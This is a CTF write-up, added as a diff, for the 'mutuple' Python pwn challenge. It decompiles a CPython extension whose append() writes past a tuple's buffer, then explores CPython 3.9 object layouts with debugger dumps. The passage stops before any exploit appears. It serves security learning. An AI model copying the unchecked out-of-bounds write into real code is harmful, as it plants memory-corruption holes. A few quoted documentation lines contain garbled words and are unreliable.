@@ -1,0 +1,1058 @@
+---
+title: SCTF 2025 - Mutuple
+date: 2025-10-29
+category: writeups
+excerpt: My first CPython pwn challenge
+tags:
+  - pwn
+---
+
+import Challenge from "@components/Challenge.vue";
+
+Back in late July, Sieberrsec hosted their first-ever in-person finals for the annual Sieberr event. At the same time, I
+was stuck in camp, bored out of my mind, and so I started to play around with the Python internals. The result is this
+challenge which I feel is quite a fun introduction to certain concepts that are also used in v8 exploitation. I'm a
+little late for this writeup because I was busy with a bunch of other stuff, but here it is! 
+
+<Challenge
+  title="mutuple"
+  flag="sctf{ther3s_mulTUPLE_w4ys_t0_s0lve_th15_ch4ll_xD_xD_xD_im_s0_funny_heheh3h4_tupl3_Tup73_tup1e_Tupl3_tuple}"
+  solves={0}
+  files={[{name: "dist.zip", url:
+"https://github.com/Sieberrsec-CTF/Sieberrsec-CTF-2025-Public/raw/refs/heads/main/finals/pwn/mutuple/dist/dist-mutuple.zip"}]}
+>
+  I made tuples mutable... you can call them mutuples ecks dee
+
+
+  (ps. if you feel like your solution is unintended, please open a ticket and let us know!)
+</Challenge>
+
+# Analysis
+
+In IDA, we can jump to the `definition{:c}` object in the `PyInit_mutuple{:c}` function. The object contains all the
+information we need to know about this module, including the methods that it creates. In this case, there's only 1
+function that it creates, bound to `mutuple.append{:py}`. This is what it looks like in IDA:
+
+```
+.data:0000000000004060                 public definition
+.data:0000000000004060 ; PyModuleDef definition
+.data:0000000000004060 definition      PyModuleDef <<0>, offset aMutuple, 0, 0, offset methods, 0, 0, 0, 0>
+.data:0000000000004060                                         ; DATA XREF: LOAD:0000000000000440↑o
+.data:0000000000004060                                         ; .got:definition_ptr↑o
+.data:0000000000004060                                         ; "mutuple"
+.data:00000000000040C8                 align 20h
+.data:00000000000040E0                 public methods
+.data:00000000000040E0 ; PyMethodDef methods[1]
+.data:00000000000040E0 methods         PyMethodDef <offset aAppend, offset method_append, 1, 0>
+.data:00000000000040E0                                         ; DATA XREF: LOAD:0000000000000428↑o
+.data:00000000000040E0                                         ; .data:definition↑o
+.data:00000000000040E0 _data           ends                    ; "append"
+```
+
+Looking at the `append{:c}` function, it's actually quite short.
+
+```c
+PyObject *__fastcall method_append(PyObject *self, PyObject *args)
+{
+  PyTupleObject *v2; // rax
+  Py_ssize_t ob_size; // rdx
+  PyTupleObject *the_tuple; // [rsp+8h] [rbp-20h] BYREF
+  PyObject *to_add[3]; // [rsp+10h] [rbp-18h] BYREF
+
+  to_add[1] = (PyObject *)__readfsqword(0x28u);
+  the_tuple = 0;
+  to_add[0] = 0;
+  if ( !(unsigned int)PyArg_UnpackTuple(args, "ref", 2, 2, &the_tuple, to_add) )
+    return 0;
+  v2 = the_tuple;
+  if ( (the_tuple->ob_base.ob_base.ob_type->tp_flags & 0x4000000) != 0 )
+  {
+    ob_size = the_tuple->ob_base.ob_size;
+    the_tuple->ob_base.ob_size = ob_size + 1;
+    v2->ob_item[ob_size] = to_add[0];
+    return (PyObject *)&Py_TrueStruct;
+  }
+  else
+  {
+    PyErr_SetString(PyExc_TypeError, "first argument must be of type tuple");
+    return 0;
+  }
+}
+```
+
+The first operation we see is `PyArg_UnpackTuple{:c}`. Taking a look at the
+[documentation](https://docs.python.org/3/c-api/arg.html#c.PyArg_UnpackTuple):
+
+> `int PyArg_UnpackTuple(PyObject *args, const char *name, Py_ssize_t min,
+> Py_ssize_t max, ...){:c}`
+>
+> A simpler form of parameter retrieval which does not use a format string to
+> specify the types of the arguments. Functions which use this method to
+> retrieve their parameters should be declared as METH_VARARGS in function or
+> method tables. The tuple containing the actual parameters should be passed as
+> args; it must actually be a tuple. The length of the tuple must be at least
+> min and no more than max; min and max may be equal. Additional arguments must
+> be passed to the function, each of which should be a pointer to a PyObject*
+> variable; these will be filled in with the valueefroeargs; they will contain
+> borrowed references. The variables which correspond to optional parameters not
+> given by args will not be filled in; these should be initialized by the
+> caller. This function returns true on success and false if args is not a tuple
+> or contains the wrong number of elements; an exception will be set if there
+> was a failure.
+
+So `args{:c}` (which, by default, is constructed as a tuple when calling a function with arguments) should have 2
+elements. The first element should be a tuple, and is stored in `the_tuple{:c}`. The second element can be any
+`PyObject` and is stored in `to_add{:c}`.
+
+Then, the module simply increments the size of the tuple by 1, and appends the `to_add{:c}` element to the tuple's
+`ob_item{:c}` array.
+
+This is quite simple, and the vulnerability is in plain sight: we will eventually assign to the tuple's backing buffer
+out-of-bounds.
+
+# Exploration
+
+With this primitive in mind, let's now take a look at how CPython objects work! For me, this part was pretty fun (and
+information as well), because these stuff aren't really well-documented, but the structs themselves are simple enough so
+we can make sense of them pretty easily. Some (most) of the following won't be very relevant to the challenge; they're
+mostly just stuff that I discovered while planning this challenge. If you're just interested in the writeup, you can
+skip ahead to TODO and refer back another time!
+
+Since our structs may differ from Python version to version, for the sake of completeness, these are the specifications
+I'm running the challenge on:
+
+- Docker image `ubuntu:20.04@sha256:8feb4d8ca5354def3d8fce243717141ce31e2c428701f6682bd2fafe15388214`
+- Python 3.9.5
+
+You can refer to the Dockerfile for more details.
+
+To compile Python with debugging symbols, we can get [the source from
+here](https://www.python.org/downloads/release/python-395/), and run the
+following commands in the extracted directory:
+
+```bash
+export CFLAGS="-fno-pie -g"
+export LDFLAGS="-no-pie"
+mkdir debug && cd debug
+../configure
+make
+```
+
+After successful compilation, the binary `python` is created and we can debug it
+using `pwndbg`.
+
+Unfortunately, because of pwndbg's own Python runtime, we might run into the
+following error when trying to debug `python3.9` inside pwndbg:
+
+```
+Python path configuration:
+  PYTHONHOME = '/usr/local/lib/pwndbg-gdb'
+  PYTHONPATH = (not set)
+  program name = '/usr/bin/python3.9'
+  isolated = 0
+  environment = 1
+  user site = 0
+  import site = 1
+  sys._base_executable = '/usr/bin/python3.9'
+  sys.base_prefix = '/usr/local/lib/pwndbg-gdb'
+  sys.base_exec_prefix = '/usr/local/lib/pwndbg-gdb'
+  sys.platlibdir = 'lib'
+  sys.executable = '/usr/bin/python3.9'
+  sys.prefix = '/usr/local/lib/pwndbg-gdb'
+  sys.exec_prefix = '/usr/local/lib/pwndbg-gdb'
+  sys.path = [
+    '/usr/local/lib/pwndbg-gdb/lib/python39.zip',
+    '/usr/local/lib/pwndbg-gdb/lib/python3.9',
+    '/usr/local/lib/pwndbg-gdb/lib/python3.9/lib-dynload',
+  ]
+Fatal Python error: init_fs_encoding: failed to get the Python codec of the filesystem encoding
+Python runtime state: core initialized
+ModuleNotFoundError: No module named 'encodings'
+```
+
+To fix this, we need to set the `PYTHONPATH` environment variable to the Python
+pre-installed module directory. In the Docker container, this is
+`/usr/lib/python3.9` - I copied this directory out into my host and set the
+env var to the relative path. After setting this, we should be ready to debug!
+
+## The heap
+
+The Python heap is a lot more nuanced than what we'll be covering in this
+writeup, but it's not the main focus so I'll gloss over it a bit. 
+
+Essentially, there is a general-purpose allocator that is in charge of
+allocating all types of objects. Operating below this general-purpose allocator
+are object-specific allocators that have their own regions (which are
+contained in the general-purpose allocator's arena). Thus, certain objects that
+have object-specific allocators may not be allocated in the same region as another
+object. We can refer to this explanation in `Objects/obmalloc.c`:
+
+```
+   An object allocator for Python.
+
+   Here is an introduction to the layers of the Python memory architecture,
+   showing where the object allocator is actually used (layer +2), It is
+   called for every object allocation and deallocation (PyObject_New/Del),
+   unless the object-specific allocators implement a proprietary allocation
+   scheme (ex.: ints use a simple free list). This is also the place where
+   the cyclic garbage collector operates selectively on container objects.
+
+
+    Object-specific allocators
+    _____   ______   ______       ________
+   [ int ] [ dict ] [ list ] ... [ string ]       Python core         |
++3 | <----- Object-specific memory -----> | <-- Non-object memory --> |
+    _______________________________       |                           |
+   [   Python's object allocator   ]      |                           |
++2 | ####### Object memory ####### | <------ Internal buffers ------> |
+    ______________________________________________________________    |
+   [          Python's raw memory allocator (PyMem_ API)          ]   |
++1 | <----- Python memory (under PyMem manager's control) ------> |   |
+    __________________________________________________________________
+   [    Underlying general-purpose allocator (ex: C library malloc)   ]
+ 0 | <------ Virtual memory allocated for the python process -------> |
+
+   =========================================================================
+    _______________________________________________________________________
+   [                OS-specific Virtual Memory Manager (VMM)               ]
+-1 | <--- Kernel dynamic storage allocation & management (page-based) ---> |
+    __________________________________   __________________________________
+   [                                  ] [                                  ]
+-2 | <-- Physical memory: ROM/RAM --> | | <-- Secondary storage (swap) --> |
+```
+
+The object allocator (pymalloc) requests large pages via `mmap{:c}` to form
+arenas. Each arena is then subdivided into pools of different sizes, where the
+object size of the n+1th pool is 8 bytes greater than the nth pool. Each pool is
+4kb (or the system defined page size) and there are 64 pools in an arena.
+Allocations larger than 512 bytes skip pymalloc and are directly allocated by
+the system allocator (eg. `malloc{:c}`).
+
+In another post I'll detail each object and where it's allocated. But for this
+challenge, it's not so important so I'll skip it for now.
+
+## Objects
+
+Every object in Python is either of type `PyObject{:c}` or `PyVarObject{:c}`.
+
+```c title="Include/object.h"
+typedef struct _object {
+    _PyObject_HEAD_EXTRA
+    Py_ssize_t ob_refcnt;
+    PyTypeObject *ob_type;
+} PyObject;
+
+typedef struct {
+    PyObject ob_base;
+    Py_ssize_t ob_size; /* Number of items in variable part */
+} PyVarObject;
+```
+
+The only difference is that `PyVarObject{:c}` has an additional field indicating
+the size of the _variable_ length object. This header is used in all Python
+objects, and following this header are the member fields of the object.
+
+A very common object that we can analyze is the `PyTypeObject` generic object.
+
+```c title="Include/cpython/object.h"
+struct _typeobject {
+    PyObject_VAR_HEAD
+    const char *tp_name; /* For printing, in format "<module>.<name>" */
+    Py_ssize_t tp_basicsize, tp_itemsize; /* For allocation */
+
+    /* Methods to implement standard operations */
+
+    destructor tp_dealloc;
+    Py_ssize_t tp_vectorcall_offset;
+    getattrfunc tp_getattr;
+    setattrfunc tp_setattr;
+    PyAsyncMethods *tp_as_async; /* formerly known as tp_compare (Python 2)
+                                                                                                      or
+tp_reserved (Python 3) */
+    reprfunc tp_repr;
+
+    /* Method suites for standard classes */
+
+    PyNumberMethods *tp_as_number;
+    PySequenceMethods *tp_as_sequence;
+    PyMappingMethods *tp_as_mapping;
+
+    /* More standard operations (here for binary compatibility) */
+
+    hashfunc tp_hash;
+    ternaryfunc tp_call;
+    reprfunc tp_str;
+    getattrofunc tp_getattro;
+    setattrofunc tp_setattro;
+
+    /* Functions to access object as input/output buffer */
+    PyBufferProcs *tp_as_buffer;
+
+    /* Flags to define presence of optional/expanded features */
+    unsigned long tp_flags;
+
+    const char *tp_doc; /* Documentation string */
+
+    /* Assigned meaning in release 2.0 */
+    /* call function for all accessible objects */
+    traverseproc tp_traverse;
+
+    /* delete references to contained objects */
+    inquiry tp_clear;
+
+    /* Assigned meaning in release 2.1 */
+    /* rich comparisons */
+    richcmpfunc tp_richcompare;
+
+    /* weak reference enabler */
+    Py_ssize_t tp_weaklistoffset;
+
+    /* Iterators */
+    getiterfunc tp_iter;
+    iternextfunc tp_iternext;
+
+    /* Attribute descriptor and subclassing stuff */
+    struct PyMethodDef *tp_methods;
+    struct PyMemberDef *tp_members;
+    struct PyGetSetDef *tp_getset;
+    struct _typeobject *tp_base;
+    PyObject *tp_dict;
+    descrgetfunc tp_descr_get;
+    descrsetfunc tp_descr_set;
+    Py_ssize_t tp_dictoffset;
+    initproc tp_init;
+    allocfunc tp_alloc;
+    newfunc tp_new;
+    freefunc tp_free; /* Low-level free-memory routine */
+    inquiry tp_is_gc; /* For PyObject_IS_GC */
+    PyObject *tp_bases;
+    PyObject *tp_mro; /* method resolution order */
+    PyObject *tp_cache;
+    PyObject *tp_subclasses;
+    PyObject *tp_weaklist;
+    destructor tp_del;
+
+    /* Type attribute cache version tag. Added in version 2.6 */
+    unsigned int tp_version_tag;
+
+    destructor tp_finalize;
+    vectorcallfunc tp_vectorcall;
+};
+```
+
+Every class object is an instance of `PyTypeObject{:c}`. Let's look at one
+example, integers (or `PyLong_Type`).
+
+### `PyLong_Type{:c}`
+
+```c title="Objects/longobject.c"
+PyTypeObject PyLong_Type = {
+    PyVarObject_HEAD_INIT(&PyType_Type, 0)
+    "int",                                      /* tp_name */
+    offsetof(PyLongObject, ob_digit),           /* tp_basicsize */
+    sizeof(digit),                              /* tp_itemsize */
+    0,                                          /* tp_dealloc */
+    0,                                          /* tp_vectorcall_offset */
+    0,                                          /* tp_getattr */
+    0,                                          /* tp_setattr */
+    0,                                          /* tp_as_async */
+    long_to_decimal_string,                     /* tp_repr */
+    &long_as_number,                            /* tp_as_number */
+    0,                                          /* tp_as_sequence */
+    0,                                          /* tp_as_mapping */
+    (hashfunc)long_hash,                        /* tp_hash */
+    0,                                          /* tp_call */
+    0,                                          /* tp_str */
+    PyObject_GenericGetAttr,                    /* tp_getattro */
+    0,                                          /* tp_setattro */
+    0,                                          /* tp_as_buffer */
+    Py_TPFLAGS_DEFAULT | Py_TPFLAGS_BASETYPE |
+        Py_TPFLAGS_LONG_SUBCLASS,               /* tp_flags */
+    long_doc,                                   /* tp_doc */
+    0,                                          /* tp_traverse */
+    0,                                          /* tp_clear */
+    long_richcompare,                           /* tp_richcompare */
+    0,                                          /* tp_weaklistoffset */
+    0,                                          /* tp_iter */
+    0,                                          /* tp_iternext */
+    long_methods,                               /* tp_methods */
+    0,                                          /* tp_members */
+    long_getset,                                /* tp_getset */
+    0,                                          /* tp_base */
+    0,                                          /* tp_dict */
+    0,                                          /* tp_descr_get */
+    0,                                          /* tp_descr_set */
+    0,                                          /* tp_dictoffset */
+    0,                                          /* tp_init */
+    0,                                          /* tp_alloc */
+    long_new,                                   /* tp_new */
+    PyObject_Del,                               /* tp_free */
+};
+```
+
+When we call `int(){:c}` to create an integer, `PyLong_Type->tp_new{:c}` is
+called. However, it doesn't seem like this method is called if we create an
+integer natively. It is interesting to investigate this, and I'll leave it for
+future study.
+
+We also notice the following behaviour: for integers in the range \[-5, 256\],
+they are not allocated in the current `pymalloc` region that we're using for
+object allocations. Instead, they're pre-initialized in `pycore_init_types{:c}`,
+where the call to `_PyLong_Init{:c}` is made.
+
+```c title="Objects/longobject.h"
+#if NSMALLNEGINTS + NSMALLPOSINTS > 0
+    for (Py_ssize_t i=0; i < NSMALLNEGINTS + NSMALLPOSINTS; i++) {
+        sdigit ival = (sdigit)i - NSMALLNEGINTS;
+        int size = (ival < 0) ? -1 : ((ival == 0) ? 0 : 1);
+
+        PyLongObject *v = _PyLong_New(1);
+        if (!v) {
+            return -1;
+        }
+
+        Py_SET_SIZE(v, size);
+        v->ob_digit[0] = (digit)abs(ival);
+
+        tstate->interp->small_ints[i] = v;
+    }
+#endif
+```
+
+Pointers to these small integers are stored in the global
+`PyInterpreterState{:c}` (which is also allocated on the `pymalloc{:c}` heap).
+
+```c title="Include/internal/pycore_interp.h"
+#define _PY_NSMALLPOSINTS           257
+#define _PY_NSMALLNEGINTS           5
+
+// The PyInterpreterState typedef is in Include/pystate.h.
+struct _is {
+
+  // ...
+
+#if _PY_NSMALLNEGINTS + _PY_NSMALLPOSINTS > 0
+    /* Small integers are preallocated in this array so that they
+       can be shared.
+       The integers that are preallocated are those in the range
+       -_PY_NSMALLNEGINTS (inclusive) to _PY_NSMALLPOSINTS (not inclusive).
+    */
+    PyLongObject* small_ints[_PY_NSMALLNEGINTS + _PY_NSMALLPOSINTS];
+#endif
+};
+```
+
+
+The following snippet illustrates this:
+
+```py
+>>> a = 1
+>>> b = 0xdeadbeef
+>>> hex(id(a))
+'0x7ffff7e532c0'
+>>> hex(id(b))
+'0x7ffff775fec0'
+```
+
+`a` is a small int and is allocated in a separate page from the current
+`pymalloc` region.
+
+> Note that depending on the Python version, this page may or may not be
+> adjacent to the binary's base address. I suspect `pymalloc` initially uses the
+> `brk` syscall to extend the heap region, and depending on how many objects
+> were initialized, this heap region may be filled up pre-maturely. In that
+> case, `pymalloc` needs to request new pages from `mmap`. If this `pymalloc`
+> expansion happens before the `small_ints` are created, then our small integers
+> will end up in the `mmap` region, and will not be adjacent to the binary base.
+> I've tested it out on a few different systems and Python versions, and it
+> seems to differ from version to version, but consistent regardless of the
+> system.
+
+We can also observe the following:
+
+```py
+>>> c = 1
+>>> d = 0xdeadbeef
+>>> hex(id(c))
+'0x7ffff7e532c0'
+>>> hex(id(d))
+'0x7ffff775fe40'
+```
+
+In the same environment, we create 2 more variables `c` and `d`. `c` is pointing
+to the same address as `a`, while `d` creates a new `PyLongObject{:c}` right
+after `b`. That's because the integer instantiation code knows that we need a
+small int, and directly returns the pre-initialized small int. For bigger ints,
+we have no choice but to create a new int.
+
+Now, let's take a look at what's actually stored in memory!
+
+This is the implementation of `PyLongObject{:c}`. Interestingly, it's defined as
+a `PyVarObject{:c}`.
+
+```c
+/* Long integer representation.
+   The absolute  to  of a number is equal to
+        SUM(for i=0 through abs(ob_size)-1) ob_digit[i] * 2**(SHIFT*i)
+   Negative numbers are represented with ob_size < 0;
+   zero is represented by ob_size == 0.
+   In a normalized number, ob_digit[abs(ob_size)-1] (the most significant
+   digit) is never zero.  Also, in all cases, for all valid i,
+        0 <= ob_digit[i] <= MASK.
+   The allocation function takes care of allocating extra memory
+   so that ob_digit[0] ... ob_digit[abs(ob_size)-1] are actually available.
+
+   CAUTION:  Generic code manipulating subtypes of PyVarObject has to
+   aware that ints abuse  ob_size's sign bit.
+*/
+struct _longobject {
+    PyObject_VAR_HEAD
+    digit ob_digit[1];
+};
+```
+
+Let's take a look at the integers we allocated earlier.
+
+```ansi title="a = 1"
+[1m[32mpwndbg> [0mtel 0x7ffff7e532c0
+00:0000│  [35m0x7ffff7e532c0[39m ◂— 0x69 /* 'i' */
+01:0008│  [35m0x7ffff7e532c8[39m —▸ [35m0x7607e0 (PyLong_Type)[39m ◂— 0x43 /* 'C' */
+02:0010│  [35m0x7ffff7e532d0[39m ◂— 1
+03:0018│  [35m0x7ffff7e532d8[39m ◂— 0xfdfdfdfd00000001
+```
+
+```ansi title="b = 0xdeadbeef"
+[1m[32mpwndbg> [0mtel 0x7ffff775fec0
+00:0000│  [35m0x7ffff775fec0[39m ◂— 1
+01:0008│  [35m0x7ffff775fec8[39m —▸ [35m0x7607e0 (PyLong_Type)[39m ◂— 0x43 /* 'C' */
+02:0010│  [35m0x7ffff775fed0[39m ◂— 2
+03:0018│  [35m0x7ffff775fed8[39m ◂— 0x31eadbeef
+```
+
+The `SHIFT` value defined on 64-bit is 30 (on 32-bit, it's 15). For `a =
+1{:py}`, `ob_size == 1{:c}` so there is no special math going on, we just take
+the value in the first 4 bytes of the `PyLongObject{:c}`'s data. For `b =
+0xdeadbeef{:py}`, `ob_size == 2{:c}`:
+
+```py
+>>> hex(0x31eadbeef & 0b111111111111111111111111111111)
+'0x1eadbeef'
+>>> hex((0x31eadbeef >> 32) & 0b111111111111111111111111111111)
+'0x3'
+>>> hex(0x1eadbeef + 0x3 * 2 ** 30)
+'0xdeadbeef'
+```
+
+How about negative numbers?
+
+```ansi title="a = -1"
+[1m[32mpwndbg> [0mtel 0x7ffff7e53240
+00:0000│  [35m0x7ffff7e53240[39m ◂— 0x1d
+01:0008│  [35m0x7ffff7e53248[39m —▸ [35m0x7607e0 (PyLong_Type)[39m ◂— 0x43 /* 'C' */
+02:0010│  [35m0x7ffff7e53250[39m ◂— 0xffffffffffffffff
+03:0018│  [35m0x7ffff7e53258[39m ◂— 0xfdfdfdfd00000001
+```
+
+Ah, so for negative numbers, the `ob_size{:c}` field is set to a negative value.
+
+It's good to note that booleans are also implemented using `PyLongObject{:c}`,
+with the `ob_type{:c}` field set to `PyBool_Type{:c}` instead of
+`PyLong_Type{:c}`. In fact, `PyBool_Type{:c}` is a subclass of `PyLong_Type{:c}`
+as we can see here - its `tp_base{:c}` member is set to `PyLong_Type{:c}`.
+
+```c title="Objects/boolobject.c" {32}
+PyTypeObject PyBool_Type = {
+    PyVarObject_HEAD_INIT(&PyType_Type, 0)
+    "bool",
+    sizeof(struct _longobject),
+    // ...
+    &PyLong_Type,                               /* tp_base */
+    // ...
+};
+```
+
+Another object that would be interesting for us is the list object.
+
+### `PyList_Type{:c}`
+
+Unlike `PyLongObject{:c}`, there are no pre-initialized `PyListObject{:c}`. This
+is because a list is mutable and hence we need to allocate a new one for each
+variable, even if it's just the empty list.
+
+```py
+>>> a = []
+>>> b = [1, 2, 3]
+>>> c = []
+>>> d = [1, 2, 3]
+>>> hex(id(a))
+'0x7ffff777e320'
+>>> hex(id(b))
+'0x7ffff77829b0'
+>>> hex(id(c))
+'0x7ffff7782a50'
+>>> hex(id(d))
+'0x7ffff7782aa0'
+```
+
+Although the `PyListObject{:c}` is defined as a `PyVarObject{:c}`, it actually
+has an `ob_size{:c}` value of 0. The backing buffer of the list is allocated
+elsewhere on the heap, so that it's easier to grow or shrink the buffer as
+needed. The `PyListObject{:c}` has a `ob_basicsize{:c}` of 0x28 and
+`ob_itemsize{:c}` of 0x0.
+
+```ansi title="a = [1, 2, 3]"
+[1m[32mpwndbg> [0mtel 0x7ffff777e320
+00:0000│  [35m0x7ffff777e320[39m ◂— 1
+01:0008│  [35m0x7ffff777e328[39m —▸ [35m0x7602a0 (PyList_Type)[39m ◂— 0x28 /* '(' */
+02:0010│  [35m0x7ffff777e330[39m ◂— 3
+03:0018│  [35m0x7ffff777e338[39m —▸ [35m0x7ffff7783c40[39m —▸ [35m0x7ffff7e532c0[39m ◂— 0x68 /* 'h' */
+04:0020│  [35m0x7ffff777e340[39m ◂— 8
+```
+
+The reason why it's defined as a `PyVarObject{:c}` is so that we can abuse the
+`ob_size{:c}` member again, this time to define the length of the list. 
+
+```c title="Include/cpython/listobject.h"
+typedef struct {
+    PyObject_VAR_HEAD
+    /* Vector of pointers to list elements.  list[0] is ob_item[0], etc. */
+    PyObject **ob_item;
+
+    /* ob_item contains space for 'allocated' elements.  The number
+     * currently in use is ob_size.
+     * Invariants:
+     *     0 <= ob_size <= allocated
+     *     len(list) == ob_size
+     *     ob_item == NULL implies ob_size == allocated == 0
+     * list.sort() temporarily sets allocated to -1 to detect mutations.
+     *
+     * Items must normally not be NULL, except during construction when
+     * the list is not yet visible outside the function that builds it.
+     */
+    Py_ssize_t allocated;
+} PyListObject;
+```
+
+`allocated{:c}` stores the maximum capacity of the backing buffer.
+
+In another post I'll detail the expanding and shrinking algorithms of the list.
+Let's move on to tuples!
+
+### `PyTuple_Type{:c}`
+
+As opposed to lists, tuples are immutable, so we can share instances. In fact,
+the memory management system of tuples is quite different from regular objects.
+This is because it's so ubiquitous throughout the codebase, being used to pass
+arguments to functions and so on. Therefore, specifically for tuples, there's a
+global `free_list` variable that stores up to `PyTuple_MAXFREELIST{:c}` unused
+tuple objects that are size `PyTuple_MAXSAVESIZE{:c}` and smaller.
+
+```c title="Objects/tupleobject.c"
+/* Speed optimization to avoid frequent malloc/free of small tuples */
+#ifndef PyTuple_MAXSAVESIZE
+#define PyTuple_MAXSAVESIZE     20  /* Largest tuple to save on free list */
+#endif
+#ifndef PyTuple_MAXFREELIST
+#define PyTuple_MAXFREELIST  2000  /* Maximum number of tuples of each size to save */
+#endif
+
+#if PyTuple_MAXSAVESIZE > 0
+/* Entries 1 up to PyTuple_MAXSAVESIZE are free lists, entry 0 is the empty
+   tuple () of which at most one instance will be allocated.
+*/
+static PyTupleObject *free_list[PyTuple_MAXSAVESIZE];
+static int numfree[PyTuple_MAXSAVESIZE];
+#endif
+```
+
+When a tuple is freed, instead of being cleaned up by the gc, it's sent to the
+tuple free list, and when an allocation of the same size is requested, a tuple
+is returned from the free list in a LIFO manner.
+
+Note that the empty tuple is actually not explicitly pre-allocated. Checking the
+implementation of `PyTuple_New{:c}` and `tuple_alloc{:c}`, there is special
+handling logic for the empty tuple, which means that it is possible for a tuple
+of size 0 to be allocated during runtime (which itself implies that there is a
+point during runtime when the empty tuple was unallocated).
+However, once the empty tuple is allocated it is never freed, which
+`PyTuple_New{:c}` takes care of by increasing its refcount by 1.
+
+```c
+#if PyTuple_MAXSAVESIZE > 0
+    if (size == 0) {
+        free_list[0] = op;
+        ++numfree[0];
+        Py_INCREF(op);          /* extra INCREF so that this is never freed */
+    }
+#endif
+``` 
+
+By the time we (the user) can execute instructions, the empty tuple is already
+allocated; it seems to be allocated outside of the current `pymalloc{:c}`
+region, in the same region as the `small_ints{:c}`.
+
+```py
+>>> a = ()
+>>> hex(id(a))
+'0x7ffff7e1d040'
+>>> hex(id(2147483648))
+'0x7ffff7b10b30'
+>>> hex(id(1))
+'0x7ffff7e1f930'
+```
+
+As usual, let's look at how the tuple is stored in memory.
+
+```c title="Include/cpython/tupleobject.h"
+typedef struct {
+    PyObject_VAR_HEAD
+    /* ob_item contains space for 'ob_size' elements.
+       Items must normally not be NULL, except during construction when
+       the tuple is not yet visible outside the function that builds it. */
+    PyObject *ob_item[1];
+} PyTupleObject;
+```
+
+```ansi title="a = (1, 2, 3)"
+[1m[32mpwndbg> [0mtel 0x7ffff7b0f040
+00:0000│  [35m0x7ffff7b0f040[39m ◂— 1
+01:0008│  [35m0x7ffff7b0f048[39m —▸ [35m0x6ca6a0 (PyTuple_Type)[39m ◂— 0x48 /* 'H' */
+02:0010│  [35m0x7ffff7b0f050[39m ◂— 3
+03:0018│  [35m0x7ffff7b0f058[39m —▸ [35m0x7ffff7e1f930[39m /* 1 */
+04:0020│  [35m0x7ffff7b0f060[39m —▸ [35m0x7ffff7e1f950[39m /* 2 */
+05:0028│  [35m0x7ffff7b0f068[39m —▸ [35m0x7ffff7e1f970[39m /* 3 */
+```
+
+This time, unlike integer and list, tuple actually uses `ob_size{:c}` in the
+proper way. `tp_basicsize{:c}` is 0x18 and `tp_itemsize{:c}` is 0x8. During
+initialization of the tuple, pointers to each element is stored contiguously in
+the `ob_item{:c}` array.
+
+
+Another object worth looking into is the string. In this case, because string is actually pretty complicated due to
+encodings and stuff, let's look at bytestrings instead.
+
+### `PyBytes_Type{:c}`
+
+Bytestrings are immutable too, which means we can share instances of bytestrings. The initialization function for
+bytestrings does exactly that:
+
+```c
+PyObject *
+PyBytes_FromString(const char *str)
+{
+    size_t size;
+    PyBytesObject *op;
+
+    assert(str != NULL);
+    size = strlen(str);
+    if (size > PY_SSIZE_T_MAX - PyBytesObject_SIZE) {
+        PyErr_SetString(PyExc_OverflowError,
+            "byte string is too long");
+        return NULL;
+    }
+    if (size == 0 && (op = nullstring) != NULL) {
+        Py_INCREF(op);
+        return (PyObject *)op;
+    }
+    if (size == 1 && (op = characters[*str & UCHAR_MAX]) != NULL) {
+        Py_INCREF(op);
+        return (PyObject *)op;
+    }
+
+    /* Inline PyObject_NewVar */
+    op = (PyBytesObject *)PyObject_MALLOC(PyBytesObject_SIZE + size);
+    if (op == NULL)
+        return PyErr_NoMemory();
+    (void)PyObject_INIT_VAR(op, &PyBytes_Type, size);
+    op->ob_shash = -1;
+    memcpy(op->ob_sval, str, size+1);
+    /* share short strings */
+    if (size == 0) {
+        nullstring = op;
+        Py_INCREF(op);
+    } else if (size == 1) {
+        characters[*str & UCHAR_MAX] = op;
+        Py_INCREF(op);
+    }
+    return (PyObject *) op;
+}
+```
+
+Bytestrings of length 0 or 1 are stored as singletons. Like the empty tuple, once they're allocated, they are excluded
+from garbage collection by arbitrarily increasing their refcount by 1. Also like the empty tuple, this may not
+necessarily happen at runtime, but because bytestrings are quite commonly used as well (albeit not as much as tuples)
+there are inevitably some bytestrings that get initialized before the interpreter executes our code.
+
+This is how a bytestring is represented in memory:
+
+```ansi title="a = b'asdf'"
+[1m[32mpwndbg> [0mtel 0x7ffff779c5a0
+00:0000│  [35m0x7ffff779c5a0[39m ◂— 1
+01:0008│  [35m0x7ffff779c5a8[39m —▸ [35m0x6bc260 (PyBytes_Type)[39m ◂— 0x46 /* 'F' */
+02:0010│  [35m0x7ffff779c5b0[39m ◂— 4
+03:0018│  [35m0x7ffff779c5b8[39m ◂— 0x4e9eeb8be34b206b
+04:0020│  [35m0x7ffff779c5c0[39m ◂— 0x66647361 /* 'asdf' */
+```
+
+And the struct:
+
+```c
+typedef struct {
+    PyObject_VAR_HEAD
+    Py_hash_t ob_shash;
+    char ob_sval[1];
+
+    /* Invariants:
+     *     ob_sval contains space for 'ob_size+1' elements.
+     *     ob_sval[ob_size] == 0.
+     *     ob_shash is the hash of the string or -1 if not computed yet.
+     */
+} PyBytesObject;
+```
+
+`PyBytesObject{:c}` is a variable sized object that has `tp_basicsize{:c}` of 0x21 and `tp_itemsize{:c}` of 0x1.
+Again, since it's immutable, the empty bytestring exists as a singleton. The actual contents of the bytestring are
+placed at +0x20 from the start of the object.
+
+The `ob_shash{:c}` member is a cached hash of the contents of the bytestring. This ensures that comparison operations
+are more efficient, since we can just compare the hash instead of comparing the entire string, and we don't need to
+recalculate the hash every time we want to do a comparison.
+
+Actually, there's a case where the immutability of bytestrings are broken:
+
+```c
+/* The following function breaks the notion that bytes are immutable:
+   it changes the size of a bytes object.  We get away with this only if there
+   is only one module referencing the object.  You can also think of it
+   as creating a new bytes object and destroying the old one, only
+   more efficiently.  In any case, don't use this if the bytes object may
+   already be known to some other part of the code...
+   Note that if there's not enough memory to resize the bytes object, the
+   original bytes object at *pv is deallocated, *pv is set to NULL, an "out of
+   memory" exception is set, and -1 is returned.  Else (on success) 0 is
+   returned, and the value in *pv may or may not be the same as on input.
+   As always, an extra byte is allocated for a trailing \0 byte (newsize
+   does *not* include that), and a trailing \0 byte is stored.
+*/
+
+int
+_PyBytes_Resize(PyObject **pv, Py_ssize_t newsize)
+{
+    PyObject *v;
+    PyBytesObject *sv;
+    v = *pv;
+    if (!PyBytes_Check(v) || newsize < 0) {
+        goto error;
+    }
+    if (Py_SIZE(v) == newsize) {
+        /* return early if newsize equals to v->ob_size */
+        return 0;
+    }
+    if (Py_SIZE(v) == 0) {
+        if (newsize == 0) {
+            return 0;
+        }
+        *pv = _PyBytes_FromSize(newsize, 0);
+        Py_DECREF(v);
